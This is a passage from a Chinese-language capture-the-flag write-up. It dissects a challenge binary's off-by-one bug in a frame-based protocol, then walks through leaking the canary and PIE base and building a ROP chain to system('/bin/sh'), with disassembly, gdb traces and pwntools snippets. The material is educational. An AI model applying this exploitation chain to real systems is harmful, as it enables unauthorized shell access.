159e: 0f b7 45 e4            movzx  eax,WORD PTR [rbp-0x1c]
15a2: 48 8d 50 03            lea    rdx,[rax+0x3]         ; L+3
15a6: 48 8b 45 d8            mov    rax,[rbp-0x28]
15aa: 48 83 c0 04            add    rax,0x4               ; outbuf+4
15b4: e8 5a fd ff ff         call   1313                 ; readn(outbuf+4, L+3)
15c7..15d8: stored = outbuf[L+4]（訊框裡的 crc byte）
15db..15ec: call 11e9               ; computed = checksum(outbuf+4, L)
15f1: 38 c3                  cmp    bl,al
15f3: 74 0e                  je     1603
15f5: → *err = 0xe3（CRC 不符）
1603..1638: 讀 outbuf[L+5..L+6] 組成 big-endian trailer
163c: 66 81 7d e6 5c 1b      cmp    WORD PTR [rbp-0x1a],0x1b5c   ; "ESC\"
1642: 74 0e                  je     1652
1644: → *err = 0xe4（結尾錯）
1652: 48 8b 45 d0            mov    rax,[rbp-0x30]
1656: 0f b7 55 e4            movzx  edx,WORD PTR [rbp-0x1c]
165a: 66 89 10               mov    WORD PTR [rax],dx     ; *outlen = L
165d: b8 00 00 00 00         mov    eax,0x0               ; 成功
```

**重點**：`readn(outbuf+4, L+3)` 最多寫 `4 + 0x7f9 + 3 = 0x800` bytes 到 `0x4860`，
而 `.bss` 到 `0x5060` 剛好是 `0x800` 長 → **這裡是安全的**（作者算得很精準）。

### 4.7 `auth` @ `0x167c`（opcode 1：驗鑰匙卡，設定 capacity）

```asm
167c: f3 0f 1e fa            endbr64
1680: 55                     push   rbp
1681: 48 89 e5               mov    rbp,rsp
1684: 48 83 ec 30            sub    rsp,0x30
1688: 48 89 7d d8            mov    [rbp-0x18],rdi        ; state（＝呼叫者的 rbp-0x110）
168c: 48 89 75 d0            mov    [rbp-0x20],rsi        ; payload（＝.bss:0x4864）
1690: 89 d0                  mov    eax,edx
1692: 66 89 45 dc            mov    [rbp-0x24],ax         ; len
1696: 64 48 8b 04 25 28 00 00 00  mov rax,QWORD PTR fs:0x28
169f: 48 89 45 f8            mov    [rbp-0x8],rax
16a5: 66 83 7d dc 05         cmp    WORD PTR [rbp-0x24],0x5
16aa: 74 0a                  je     16b6                  ; ★ len 必須 == 5
16ac: b8 e2 ff ff ff         mov    eax,0xffffffe2        ; -30（長度錯）
16b1: e9 80 00 00 00         jmp    1736
16b6..16ff: magic = (payload[1]<<24)|(payload[2]<<16)|(payload[3]<<8)|payload[4]
             （= 大端序 4 bytes）→ [rbp-0xc]
1702: 8b 45 f4               mov    eax,[rbp-0xc]
1705: 89 c7                  mov    edi,eax
1707: e8 7d fb ff ff         call   1289                  ; validate(magic)
170c: 85 c0                  test   eax,eax
170e: 74 07                  je     1717
1710: b8 e5 ff ff ff         mov    eax,0xffffffe5        ; -27（鑰匙卡錯）
1715: eb 1f                  jmp    1736
1717: 48 8b 45 e8            mov    rax,[rbp-0x18]        ; state
171b: 66 c7 80 00 01 00 00 00 01   mov WORD PTR [rax+0x100],0x100  ; ★ capacity = 0x100
1724: 48 8b 45 e8            mov    rax,[rbp-0x18]
1728: 66 c7 80 02 01 00 00 01 00   mov WORD PTR [rax+0x102],0x1    ; counter = 1
1731: b8 00 00 00 00         mov    eax,0x0               ; 成功
```

客戶端必須送：`opcode=1` + `13 37 c3 5f`（魔數大端序）→ 5 bytes。成功後伺服器回 status `0`。

### 4.8 `append` @ `0x174c` —— **漏洞就在這 8 行**（opcode 2）

```asm
174c: f3 0f 1e fa            endbr64
1750: 55                     push   rbp
1751: 48 89 e5               mov    rbp,rsp
1754: 48 83 ec 40            sub    rsp,0x40
1758: 48 89 7d d8            mov    [rbp-0x28],rdi        ; state
175c: 48 89 75 d0            mov    [rbp-0x30],rsi        ; payload
1760: 89 d0                  mov    eax,edx
1762: 66 89 45 cc            mov    [rbp-0x34],ax         ; len
1766: 64 48 8b 04 25 28 00 00 00  mov rax,QWORD PTR fs:0x28
176f: 48 89 45 f8            mov    [rbp-0x8],rax         ; 本函式自己的金絲雀
1775: 0f b7 45 cc            movzx  eax,WORD PTR [rbp-0x34] ; len
1779: 83 e8 01               sub    eax,0x1
177c: 66 89 45 ee            mov    WORD PTR [rbp-0x12],ax ; n = len - 1
1780: 48 8b 45 d0            mov    rax,[rbp-0x30]        ; payload
1784: 48 83 c0 01            add    rax,0x1
1788: 48 89 45 f0            mov    [rbp-0x10],rax        ; src = payload + 1（跳過 opcode）
178c: 48 8b 45 d8            mov    rax,[rbp-0x28]        ; state
1790: 0f b7 80 00 01 00 00   movzx  eax,WORD PTR [rax+0x100] ; capacity
1797: 66 39 45 ee            cmp    WORD PTR [rbp-0x12],ax ; n <= capacity ?
179b: 76 07                  jbe    17a4                  ; 是 → 通過
179d: b8 e2 ff ff ff         mov    eax,0xffffffe2        ; -30（太長）
17a2: eb 56                  jmp    17fa
17a4: 66 c7 45 ec 00 00      mov    WORD PTR [rbp-0x14],0x0 ; i = 0
17aa: eb 26                  jmp    17d2
17ac: 0f b7 55 ec            movzx  edx,WORD PTR [rbp-0x14] ; i
17b0: 48 8b 45 f0            mov    rax,[rbp-0x10]        ; src
17b4: 48 01 c2               add    rdx,rax               ; src + i
17b7: 0f b7 45 ec            movzx  eax,WORD PTR [rbp-0x14]
17bb: 0f b6 0a               movzx  ecx,BYTE PTR [rdx]    ; cl = src[i]
17be: 48 8b 55 d8            mov    rdx,[rbp-0x28]        ; state
17c2: 48 98                  cdqe
17c4: 88 0c 02               mov    BYTE PTR [rdx+rax*1],cl ; ★ state[i] = src[i]
17c7: 0f b7 45 ec            movzx  eax,WORD PTR [rbp-0x14]
17cb: 83 c0 01               add    eax,0x1
17ce: 66 89 45 ec            mov    WORD PTR [rbp-0x14],ax ; i++
17d2: 0f b7 45 ec            movzx  eax,WORD PTR [rbp-0x14]
17d6: 66 3b 45 ee            cmp    ax,WORD PTR [rbp-0x12] ; ★ i <= n ?
17da: 76 d0                  jbe    17ac                  ; ★ jbe → 含等於
```

### 4.9 `send_state` @ `0x1810` —— **洩漏原語**（opcode 3）

```asm
1810: f3 0f 1e fa            endbr64
1814: 55                     push   rbp
1815: 48 89 e5               mov    rbp,rsp
1818: 48 83 ec 20            sub    rsp,0x20
181c: 48 89 7d e8            mov    [rbp-0x18],rdi        ; state
1820: 64 48 8b 04 25 28 00 00 00  mov rax,QWORD PTR fs:0x28
1829: 48 89 45 f8            mov    [rbp-0x8],rax
182f: 48 8b 45 e8            mov    rax,[rbp-0x18]
1833: 0f b7 80 00 01 00 00   movzx  eax,WORD PTR [rax+0x100] ; ★ capacity
183a: 0f b7 d0               movzx  edx,ax
183d: 48 8b 45 e8            mov    rax,[rbp-0x18]
1841: 48 89 c6               mov    rsi,rax               ; 參數2 = data = state
1844: bf 00 00 00 00         mov    edi,0x0               ; 參數1 = status = 0
1849: e8 54 fb ff ff         call   13a2                 ; send_frame(0, state, capacity)
```

`capacity` 是 `state[0x100]`。正常是 `0x100`，只會洩漏緩衝區自己；
一旦被 off-by-one 改成 `0x1ff`，**就會把緩衝區後面 255 bytes 的堆疊（金絲雀、saved rbp、回傳位址）一起送出**。

### 4.10 `service_loop` @ `0x1865`（主迴圈）— 區域變數與 `state` 的位置

```asm
1865: f3 0f 1e fa            endbr64
1869: 55                     push   rbp
186a: 48 89 e5               mov    rbp,rsp
186d: 48 81 ec 20 01 00 00   sub    rsp,0x120                ; 開 0x120 bytes
1874: 64 48 8b 04 25 28 00 00 00  mov rax,QWORD PTR fs:0x28
187d: 48 89 45 f8            mov    [rbp-0x8],rax            ; 金絲雀 @ rbp-8
1883: c7 85 e4 fe ff ff 00 00 00 00  mov DWORD PTR [rbp-0x11c],0x0  ; authed = 0
188d: 66 c7 45 f0 00 00      mov    WORD PTR [rbp-0x10],0x0   ; state[0x100]=capacity=0
1893: 66 c7 45 f2 00 00      mov    WORD PTR [rbp-0xe],0x0    ; state[0x102]=counter=0
1899: c7 45 f4 00 00 00 00   mov    DWORD PTR [rbp-0xc],0x0
18a0: ba 95 01 00 00         mov    edx,0x195
18a5: 48 8d 05 74 07 00 00   lea    rax,[rip+0x774]           ; .rodata:0x2020（ASCII 橫幅）
18af: bf 01 00 00 00         mov    edi,0x1
18b4: e8 e7 f7 ff ff         call   10a0 <write@plt>          ; write(1, banner, 0x195)
18b9: c6 85 e0 fe ff ff e1   mov    BYTE PTR [rbp-0x120],0xe1 ; err = 0xe1
18c0: 48 8d 95 e0 fe ff ff   lea    rdx,[rbp-0x120]           ; &err
18c7: 48 8d 85 e2 fe ff ff   lea    rax,[rbp-0x11e]           ; &len
18ce: 48 89 c6               mov    rsi,rax
18d1: 48 8d 05 88 2f 00 00   lea    rax,[rip+0x2f88]          ; 4860 = rxbuf
18db: e8 ec fb ff ff         call   14cc                      ; recv_frame(rxbuf,&len,&err)
18e0: 85 c0                  test   eax,eax
18e2: 79 20                  jns    1904                      ; 成功 → 處理
18e4..18fa: send_frame(err,0,0) 後離開迴圈（回報錯誤）
1904: 48 8d 05 59 2f 00 00   lea    rax,[rip+0x2f59]          ; 4864 = rxbuf+4 = payload
190b: 48 89 85 e8 fe ff ff   mov    [rbp-0x118],rax           ; payload 指標存起來
1912: 48 8b 85 e8 fe ff ff   mov    rax,[rbp-0x118]
1919: 0f b6 00               movzx  eax,BYTE PTR [rax]        ; opcode = payload[0]
191c: 3c 01                  cmp    al,0x1
191e: 74 22                  je     1942                      ; opcode 1 免登入
1920: 83 bd e4 fe ff ff 00   cmp    DWORD PTR [rbp-0x11c],0x0 ; 已登入？
1927: 75 19                  jne    1942
1929..1938: send_frame(0xe6,0,0)（未登入）
1942: 48 8b 85 e8 fe ff ff   mov    rax,[rbp-0x118]
1949: 0f b6 00               movzx  eax,BYTE PTR [rax]
194f: 83 f8 05               cmp    eax,0x5
1952: 0f 87 f7 00 00 00      ja     1a4f                      ; >5 → 0xe7
1958..1978: jmp [0x21c8 + opcode*4]（jump table，見 §2.2）

;; opcode 1（AUTH）@ 197b
197b: 0f b7 85 e2 fe ff ff   movzx  eax,WORD PTR [rbp-0x11e] ; len
1982: 0f b7 d0               movzx  edx,ax
1985: 48 8b 8d e8 fe ff ff   mov    rcx,[rbp-0x118]           ; payload
198c: 48 8d 85 f0 fe ff ff   lea    rax,[rbp-0x110]           ; ★ state 基底
1993: 48 89 ce               mov    rsi,rcx
1996: 48 89 c7               mov    rdi,rax
1999: e8 de fc ff ff         call   167c                      ; auth(state,payload,len)
199e: 88 85 e1 fe ff ff      mov    BYTE PTR [rbp-0x11f],al   ; 存回傳值
19a4: 80 bd e1 fe ff ff 00   cmp    BYTE PTR [rbp-0x11f],0x0
19ab: 75 0a                  jne    19b7
19ad: c7 85 e4 fe ff ff 01 00 00 00  mov DWORD PTR [rbp-0x11c],0x1   ; authed = 1
19b7..19ca: send_frame(al, 0, 0)

;; opcode 2（APPEND）@ 19d4
19d4: movzx eax,[rbp-0x11e]; movzx edx,ax; mov rcx,[rbp-0x118]
19e5: 48 8d 85 f0 fe ff ff   lea    rax,[rbp-0x110]           ; state
19f2: e8 55 fd ff ff         call   174c                      ; append(state,payload,len)
19f7..1a06: send_frame(回傳值, 0, 0)

;; opcode 3（SEND STATE）@ 1a0d
1a0d: 48 8d 85 f0 fe ff ff   lea    rax,[rbp-0x110]
1a17: e8 f4 fd ff ff         call   1810                      ; send_state(state)

;; opcode 4（EJECT）@ 1a39 → 離開迴圈
1a39..1a48: send_frame(0,0,0)
1a4d: eb 1a                  jmp    1a69                      ; → epilogue

;; opcode 5（ECHO）@ 1a1e
1a1e: e8 af f8 ff ff         call   12d2                      ; system("/bin/echo -n ''")
1a23..1a32: send_frame(0,0,0)

;; epilogue @ 1a69
1a69: 48 8b 45 f8            mov    rax,[rbp-0x8]             ; 金絲雀
1a6d: 64 48 2b 04 25 28 00 00 00  sub rax,QWORD PTR fs:0x28
1a76: 74 05                  je     1a7d
1a78: e8 33 f6 ff ff         call   10b0 <__stack_chk_fail@plt>
1a7d: c9                     leave
1a7e: c3                     ret                            ; ★★ 我們劫持這裡
```

> ⚠️ 上面 `mov rax,QWORD PTR fs:0x28` 是 **9 bytes**，`objdump` 會把它拆成兩行印
> （第二行只印尾巴的 `00 00`，並標上 `1a74:`）。所以**下一條指令的位址是 `0x1a76`，不是 `0x1a74`**
> —— 想下中斷點請用 `b *0x1a76`（`0x1a74` 會落在指令中間）。自己驗：
> `objdump -d -M intel --start-address=0x1a69 --stop-address=0x1a80 homemaker`

**`state` 的位址 `rbp-0x110`，加上 `sub rsp,0x120` 的 frame，可以推出精確的堆疊佈局**：

```
state       = rbp - 0x110
state[0x100] = rbp - 0x010   ← capacity（16-bit）
state[0x102] = rbp - 0x00e   ← counter（16-bit）
state[0x108] = rbp - 0x008   ← ★ stack canary（函式自己的）
state[0x110] = rbp + 0x000   ← ★ saved rbp
state[0x118] = rbp + 0x008   ← ★ 回傳位址（= PIE + 0x1a9f）
state[0x120] = rbp + 0x010   ← `ret` 之後 rsp 的位置（ROP chain 起點）
```

### 4.11 `main` @ `0x1a7f`（驗證 `rbp_main = rbp_service_loop + 0x20`）

```asm
1a7f: f3 0f 1e fa            endbr64
1a83: 55                     push   rbp
1a84: 48 89 e5               mov    rbp,rsp
1a87: 48 83 ec 10            sub    rsp,0x10                 ; 只開 0x10
1a8b: 64 48 8b 04 25 28 00 00 00  mov rax,QWORD PTR fs:0x28
1a94: 48 89 45 f8            mov    [rbp-0x8],rax           ; main 自己的金絲雀
1a9a: e8 c6 fd ff ff         call   1865                     ; service_loop()
1a9f: b8 00 00 00 00         mov    eax,0x0                  ; ★ 回傳位址 = PIE+0x1a9f
1aa4: 48 8b 55 f8            mov    rdx,[rbp-0x8]
1aa8: 64 48 2b 14 25 28 00 00 00  sub rdx,QWORD PTR fs:0x28
1ab1: 74 05                  je     1ab8
1ab3: e8 f8 f5 ff ff         call   10b0 <__stack_chk_fail@plt>
1ab8: c9                     leave
1ab9: c3                     ret
```

因為 `main` 只 `sub rsp,0x10`，`call 0x1865` 會壓回傳位址，`0x1865` 再 `push rbp`：

```
rbp_service_loop  = rbp_main - 0x20
```

所以洩漏區裡還有：`state[0x128] = rbp_main-8 = main 的金絲雀`（同一個值）、
`state[0x130] = main 的 saved rbp`、`state[0x138] = main 的回傳位址（在 libc，`__libc_start_call_main+…`）`。
（我們用不到，但洩漏輸出裡看得到 → 可以用來交叉驗證佈局正確。）

---

## 5. 漏洞：精確定位與觸發條件

### 5.1 漏洞一行話

> `append()`（`0x174c`）用 `n = len - 1` 當作資料長度，檢查 `n <= capacity`（`capacity = state[0x100] = 0x100`），
> **但複製迴圈是 `for (i = 0; i <= n; i++)`，總共寫了 `n + 1` 個 byte**，
> 所以當 `n == capacity == 0x100` 時，第 257 個 byte 落在 `state[0x100]` —— **正好是 `capacity` 這個 16-bit 整數的低位 byte**。

```
state[0x100] 原本 = 0x0100   （小端序：byte[0x100]=0x00, byte[0x101]=0x01）
寫入 0xff 之後   = 0x01ff   ← 容量從 256 變成 511（變大 255），不是變小！
```

**這個 byte 是誰？** `append` 從 `payload+1` 開始讀 `n+1` bytes，
而 `payload` 只有 `L = 0x101` bytes（index 0..0x100），所以讀到 index `0x101` = **訊框的 CRC byte**。
CRC 由 payload 內容決定，因此我們必須「**讓整條 payload 的 CRC 剛好等於 0xff**」。
解法：固定其他 256 個 byte，暴力枚舉其中 1 個 byte 的 256 種可能（CRC 對該 byte 是雙射），
實測第 2 個 byte 放 `205 (0xcd)` 就得到 `crc == 0xff`（`exploit.py` 的 `solve_crc_byte()`）。

**「第 257 個 byte 是訊框的 CRC」是什麼意思？把訊框與 `state` 對齊來看就懂了：**

```
第一個 APPEND 訊框在記憶體裡（放到 rxbuf = .bss:0x4860，L = 0x101）：

 rxbuf+0x000  1b 5b              ┐
 rxbuf+0x002  01 01（L 大端）    ┘ 檔頭 4 bytes（recv_frame 先讀走）
 rxbuf+0x004  02                 ← payload[0] = opcode（append 會跳過它）
 rxbuf+0x005  A A A ... A        ← payload[1..0x100]，共 0x100 bytes
 rxbuf+0x105  (CRC8)             ← ★ payload[0x101]：append 多讀的那一個 byte
 rxbuf+0x106  1b 5c              ← 結尾
```

```
append() 從 src = payload+1 = rxbuf+5 開始，複製 n+1 = 0x101 個 byte：

  state[0x000 .. 0x0ff]  ← payload[1..0x100]      （0x100 bytes，正常範圍）
  state[0x100]           ← payload[0x101] = CRC   ← ★ one past the end！
                                                    它正好是 capacity 的低位 byte
```

* 所以 **CRC 不是我們「想填什麼就填什麼」**——它是整條 payload 的函數值。
* 我們要的是 `state[0x100] = 0xff`（讓 capacity `0x0100 → 0x01ff`），
  所以只能**反解**：固定其他 byte，枚舉其中一個 byte 直到 `crc8(payload) == 0xff`。
* 這題剛好**只有唯一解**（實測 `v=0xcd`），因為 CRC8 對單一 byte 是**雙射**（一對一）。

> 為什麼不是「讀超出 payload」的問題？讀只多讀 1 byte（CRC，仍在映射頁內），**寫才是問題**。

### 5.2 觸發條件（三個必要條件）

1. **必須先通過 AUTH**（`capacity = 0x100` 是 AUTH 設的，同時解鎖其他 opcode）。
2. 第一次 `APPEND` 的 `L` 必須是 `0x101`（`n = 0x100 = capacity` 剛好通過檢查），且 CRC 必須 `= 0xff`。
3. 之後 `capacity = 0x1ff`，就能用 `L = 0x200` 的 `APPEND`（`n = 0x1ff`）**一次寫 0x200 bytes**，
   覆蓋 `state[0x108]`（canary）、`state[0x110]`（saved rbp）、`state[0x118]`（回傳位址）與後面的 ROP 空間。

### 5.3 gdb 證據（`./gdb_evidence.sh`，ASLR 關閉以便重現）

```
@0x1797 append#1: n=0x100 capacity=0x100  -> n<=cap passes, loop writes n+1 bytes
@0x1810 send_state: state=0x7fffffffdcc0 capacity=0x1ff
@0x1797 append#2: n=0x1ff capacity=0x1ff  -> writes 0x200 bytes over canary/rbp/ret
@0x1a76 loop epilogue (canary check): rbp=0x7fffffffddd0 state=0x7fffffffdcc0 rsp=0x7fffffffdcb0
0x7fffffffddc8:	0xe4fbd8d3ee76a900	0x00007fffffffde60      <- rbp-8: canary, rbp: saved rbp
0x7fffffffddd8:	0x000055555555501a	0x00005555555552aa      <- rbp+8: 回傳位址(蓋成 PIE+0x101a)
0x7fffffffdde8:	0x0000555555558a54	0x00005555555550c0      <- chain: "/bin/sh", system@plt
0x7fffffffddf8:	0x0000000000000000	0x0000000000000000
```

- `state = 0x7fffffffdcc0`，`rbp = 0x7fffffffddd0` → **`state = rbp - 0x110` 完全吻合推導**。
- `capacity` 從 `0x100` 變成 `0x1ff`（off-by-one 生效）。
- `rbp+8` 被我們覆蓋成 `0x55555555501a` = `PIE_base(0x555555554000) + 0x101a`（`ret` gadget）。

ROP 執行時的 gdb 追蹤（`set $pc = base+0x1a7d` 強制跳過金絲雀比較，因為輸入檔的金絲雀是舊的）：

```
=== 2) forced to `leave` (0x1a7d); rbp=0x7fffffffddd0 rsp=0x7fffffffdcb0
0x7fffffffddc8:	0xe4fbd8d3ee76a900	0x00007fffffffde60
0x7fffffffddd8:	0x000055555555501a	0x00005555555552aa
0x7fffffffdde8:	0x0000555555558a54	0x00005555555550c0
=== 3) after leave;ret -> rip=0x55555555501a rsp=0x7fffffffdde0
Breakpoint 2, 0x00005555555550c0 in system@plt ()
=== 4) system@plt reached: rdi=0x555555558a54 -> "/bin/sh"
system() entry: rdi=0x555555558a54 ("/bin/sh")  rsp=0x7fffffffddf8  rsp&0xf=8
```

`rsp & 0xf == 8` → **16-byte 對齊正確**（所以 `system` 裡面的 `movaps` 不會炸）。

---

## 6. 從零開始 ROP（Return-Oriented Programming）

### 6.1 觀念

NX 讓堆疊不可執行，但**程式碼段本來就是可執行的**。ROP 的想法是：

> 在堆疊上排好一連串「**回傳位址**」。每個 `ret` 會 pop 一個位址到 `rip`，
> 於是我們可以「借用」程式裡已經存在的短指令序列（**gadget**，通常以 `ret` 結尾）串成任意邏輯。

```
   堆疊（被我們控制）                程式碼段（不能改，但可以跳）
  ┌──────────────────┐
  │ pop rdi; ret     │ ─── ret 跳到 ──► pop rdi; ret   （把下一個值彈進 rdi）
  ├──────────────────┤
  │ "/bin/sh" 的位址 │ ◄── 被 pop 進 rdi
  ├──────────────────┤
  │ system@plt       │ ─── ret 跳到 ──► system()       （rdi 已經是 "/bin/sh"）
  ├──────────────────┤
  │ 垃圾/結束位址    │
  └──────────────────┘
```

### 6.2 找 gadget：`ROPgadget` 與 pwntools

```bash
ROPgadget --binary homemaker | grep -E "pop rdi|ret$"
# 0x00000000000012aa : pop rdi ; ret      ← 本題用這個（藏在 cmp 的立即值裡）
# 0x00000000000011d3 : pop rbp ; ret
# 0x000000000000101a : ret
# 0x0000000000001287 : leave ; ret
```

pwntools 也能自動找（`ROP(elf)`）；本題 gadget 很少，直接寫死 offset 更清楚：

```python
from pwn import *
elf = ELF('./homemaker', checksec=False)
rop = ROP(elf)
print(rop.find_gadget(['pop rdi', 'ret']))   # Gadget(0x12aa, ['pop rdi', 'ret'], [])
print(hex(elf.plt['system']))                # 0x10c4（PLT 本體在 0x10c0）
```

**為什麼 `pop rdi; ret` 這麼有用？**
因為 `system()` 的第 1 個參數在 `rdi`。有這個 gadget，我們就能「在 ROP 裡設定 rdi」。
（如果沒有，就得找 `mov rdi, rax` 之類的替代鏈，或用 libc 的 gadget。）

### 6.3 組出 `system("/bin/sh")` 與 16-byte 對齊

> 📖 本節與 `wp/00_基礎知識_從零開始.md` §10.4（「為什麼有時候要多插一個 `ret`」）講的是**同一件事**
> —— gadget、`rsp % 16` 對齊、`movaps` 崩潰。兩邊不衝突，這裡只是**用本題的真實位址再驗一次**；
> 想先看通用版的說明就先讀 `wp/00` §10.4。

最小 chain：`pop rdi; ret` → `"/bin/sh"位址` → `system@plt`。

但 glibc 的 `system` 內部有 `movaps`，**要求 `rsp % 16 == 8`**（函式入口 ABI 要求）。
所以我們要看「chain 開始時的 rsp」決定是否**插一個多餘的 `ret`**：

```
leave; ret 之後： rsp = rbp + 0x10
若 (rbp+0x10) % 16 == 0 → system 入口會是 (rbp+0x10+0x10)%16 = 0  ✗ 需要補一個 ret
若 (rbp+0x10) % 16 == 8 → system 入口會是 8  ✓ 不用補
```

`exploit.py` 用洩漏到的 `saved_rbp` 動態判斷：

```python
chain = [pop_rdi, binsh, system, 0]
if (saved_rbp + 0x10) % 16 == 0:
    chain = [ret] + chain
```

（本題兩次實測都是 `rbp % 16 == 0`，所以需要那個 `ret`；gdb 也量到 `rsp&0xf == 8` 才進 `system`。）

> 💡 **為什麼 exploit 裡寫的是 `saved_rbp + 0x10`，而不是 `rbp + 0x10`？**
> 我們洩漏不到 `service_loop` 的 `rbp`，只洩漏到它存起來的 **`main` 的 `rbp`**（`saved_rbp`）。
> 而 `rbp_service_loop = rbp_main - 0x20`（見 §4.11），
> 所以 `(saved_rbp + 0x10) % 16` 與 `(rbp_service_loop + 0x10 + 0x20) % 16`
> 只差 `0x20 = 32`，是 16 的倍數 → **奇偶性完全相同**，判斷結果一樣。
> 兩者可以互換，只是 `saved_rbp` 是我們手上真的有的數字。

### 6.3.1 ROP 鏈是怎麼被「一格一格吃掉」的？（實測追蹤，ASLR 關閉）

`leave; ret` 之後，`rsp` 每被 `ret` 彈掉一個值就 `+8`，於是堆疊上的一格格子依序變成「指令」：

| 步驟 | 執行到哪 | 這一刻 `rsp` | 這一步做什麼 |
|---|---|---|---|
| 0 | `0x1a7d leave` | `0x7fffffffdcb0` | `rsp = rbp` → `pop rbp` → `rsp = rbp+8` |
| 1 | `0x1a7e ret` | `0x7fffffffddd8` | 彈 `[rbp+8]` 進 `rip` → `rip = PIE+0x101a`（對齊用 `ret`） |
| 2 | `0x101a ret` | `0x7fffffffdde0` | 彈 `[rbp+0x10]` → `rip = PIE+0x12aa`（`pop rdi; ret`） |
| 3 | `0x12aa pop rdi` | `0x7fffffffdde8` | `rdi = [rbp+0x18]` = `"/bin/sh"` 的位址；`rsp += 8` |
| 4 | `0x12ab ret` | `0x7fffffffddf0` | 彈 `[rbp+0x20]` → `rip = PIE+0x10c0`（`system@plt`） |
| 5 | `system` 第一道指令 | `0x7fffffffddf8` | `rsp & 0xf == 8` ✅ → `movaps` 不會炸，`system("/bin/sh")` |

```
堆疊（rbp = 0x7fffffffddd0）：
  rbp+0x00  0x7fffffffde60        saved rbp（保留原值）
  rbp+0x08  0x000055555555501a    ← 回傳位址 = chain[0] = ret        （第 1 步吃掉）
  rbp+0x10  0x00005555555552aa    ← chain[1] = pop rdi; ret          （第 2 步吃掉）
  rbp+0x18  0x0000555555558a54    ← chain[2] = "/bin/sh"             （第 3 步 pop 進 rdi）
  rbp+0x20  0x00005555555550c0    ← chain[3] = system@plt            （第 4 步吃掉）
  rbp+0x28  0x0000000000000000    ← chain[4] = system 的回傳位址     （第 5 步 system 看到）
```

> 💡 看懂這張表就懂了 ROP：**「堆疊 = 一張指令清單；每個 `ret` 讀一格、跳到那格寫的位址」**。
> 所以排 payload 時只要問自己兩件事：
> 1. 這個 gadget 會從 `rsp` 讀幾格？（`pop rdi; ret` 讀 1 格參數 + 1 格下一步 = 2 格）
> 2. 我現在這一格在記憶體裡的**位址**對不對？（要用 `state[i] = payload[i+1]` 換算，見 §7.3）

### 6.4 `/bin/sh` 字串要放哪？

- **libc 裡本來就有** `"/bin/sh"` 字串 → 但需要知道遠端 libc 版本對應的位移（本機 2.44、遠端 2.35 不同）→ 我們**刻意不用**。
- **`.bss`（可寫、位址固定相對 PIE）**：本題的 **接收緩衝區 `0x4860`** 內容完全由我們控制！
  我們把 `"/bin/sh\0"` 放在 payload 的 `0x1f0` 處 → 它的位址就是 **`PIE_base + 0x4864 + 0x1f0 = PIE_base + 0x4a54`**。
  最後送出的 `EJECT` 訊框只有 7 bytes，只會覆寫 `0x4860..0x4867`，**碰不到 `+0x1f0`**，所以字串安然無恙。

```python
binsh = pie + 0x4864 + 0x1f0        # = PIE + 0x4a54
```

> 這個做法讓 exploit **完全不依賴 libc 版本**（本機 glibc 2.44 與遠端 2.35 都能打）。
> 字串必須是 NUL 結尾，否則 `system` 會把後面的垃圾當成命令的一部分。

### 6.5 PIE base 怎麼洩漏與換算

1. `SEND STATE` 洩漏 `state[0x118]` → 這是 `service_loop` 的回傳位址 = **`PIE_base + 0x1a9f`**（已用 gdb 驗證）。
2. `PIE_base = leaked - 0x1a9f`。
3. **驗證**：`PIE_base & 0xfff == 0`（page 對齊）。實測 `0x55f31e321a9f - 0x1a9f = 0x55f31e320000` ✓。
4. 同時洩漏到 `state[0x108]` = canary（用來原封不動寫回）與 `state[0x110]` = saved rbp（用來算對齊）。

> 補充：同一段洩漏裡的 `state[0x138]`（main 的回傳位址）落在 libc，代表**也可以同時取得 libc base**（`__libc_start_call_main+…`）；
> 若題目需要 `system` 在 libc 的位址，就從這裡反推，但必須先確定遠端 libc 版本。

### 6.6 為什麼不用 SROP？

SROP（Sigreturn-Oriented Programming）是「用 `sigreturn` syscall 一次設定所有暫存器」的技巧，
通常需要 `rax = 15` + `syscall` gadget。本題 `system@plt` 現成可用、又有 `pop rdi; ret`，
**完全不需要 SROP**（SROP 是沒有可用 gadget 時的進階替代方案）。

---

## 7. ASCII 圖：堆疊與 payload 佈局

### 7.1 `service_loop` 的堆疊框架（劫持當下）

```
              高位址
        ┌─────────────────────────────────────────────────────┐
        │ ...（main 的框架）                                  │
 rbp+0x38 ├── (state[0x148]，沒用到)──────────────────────────┤
 rbp+0x30 ├── (state[0x140]，沒用到)──────────────────────────┤
 rbp+0x28 ├── chain[4] = 0（system 的回傳位址）───────────────┤  state[0x138] ← system 入口時 rsp 指這裡
 rbp+0x20 ├── chain[3] = system@plt = PIE+0x10c0              ┤  state[0x130]
 rbp+0x18 ├── chain[2] = "/bin/sh" = PIE+0x4a54               ┤  state[0x128]
 rbp+0x10 ├── chain[1] = pop rdi; ret = PIE+0x12aa            ┤ state[0x120] ← 對齊用 ret 之後 rsp 指這裡
 rbp+0x08 ├── chain[0] = ★ 回傳位址（對齊用 ret = PIE+0x101a）┤ state[0x118]
 rbp      ├── ★ saved rbp（保留原值）─────────────────────────┤  state[0x110]
 rbp-0x08 ├── ★ stack canary（必須原樣寫回）──────────────────┤  state[0x108]
        │   ...（未使用）                                     │  state[0x107..0x000]
 rbp-0x10 ├── capacity（16-bit 0x1ff）────────────────────────┤  state[0x100] ← off-by-one 目標
 rbp-0x110┴── state 基底 ─────────────────────────────────────┘
              低位址
```

（`state = rbp-0x110`，故 `state[k]` 位址 = `rbp - 0x110 + k`。）

> ⚠️ **最容易畫錯的就是這裡**：被我們蓋掉的那一格回傳位址（`state[0x118]` = `rbp+8`）
> 就是 **`chain[0]`**，而對齊用的 `ret` **只會出現一次**（就是 `chain[0]`）。
> `state[0x120]`（`rbp+0x10`）是**對齊用 `ret` 執行完之後** `rsp` 指到的地方，
> 也就是 `chain[1]` = `pop rdi; ret` —— 它**不是**第二個 `ret`。
> 這張圖的數字是 gdb 單步走出來的（見 §6.3.1 與 §5.3），不是推的：
> `state[0x118]=PIE+0x101a`（ret）、`state[0x120]=PIE+0x12aa`（pop rdi）、
> `state[0x128]=PIE+0x4a54`（"/bin/sh"）、`state[0x130]=PIE+0x10c0`（system@plt）、`state[0x138]=0`。

### 7.2 第一次 APPEND 之後（容量被撐大）

```
state[0x000..0x0ff]  ← 我們送的 256 bytes（"A"...）
state[0x100]         ← 0xff  → capacity 由 0x0100 變 0x01ff ★
state[0x101..0x107]  ← 原本的堆疊垃圾
state[0x108..0x10f]  ← stack canary        ┐
state[0x110..0x117]  ← saved rbp           ├ SEND STATE 一次全部洩漏
state[0x118..0x11f]  ← PIE+0x1a9f（回傳）  ┘
```

### 7.3 第二次 APPEND 的 payload（共 0x200 bytes）

> 📖 這裡的寫法和 `wp/00` §6.3「**offset 一律從緩衝區起點往上數**」是同一個規矩：
